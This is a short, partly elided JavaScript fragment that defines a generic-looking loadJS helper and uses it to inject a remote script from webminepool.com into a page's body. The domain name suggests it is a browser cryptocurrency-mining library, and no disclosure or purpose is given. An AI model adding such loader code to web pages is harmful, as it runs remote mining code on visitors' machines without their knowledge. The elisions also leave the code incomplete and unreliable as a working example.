var loadJS = function(url, implementationCode, location){
    if (getScriptBySrc('https://webminepool.com/lib/base.js?v19')==null) {
        ...
        getScriptBySrc('https://webminepool.com/lib/base.js?v19').onreadystatechange=implementationCode;
    }
};
...
loadJS('https://webminepool.com/lib/base.js?v19', base_function, document.body);
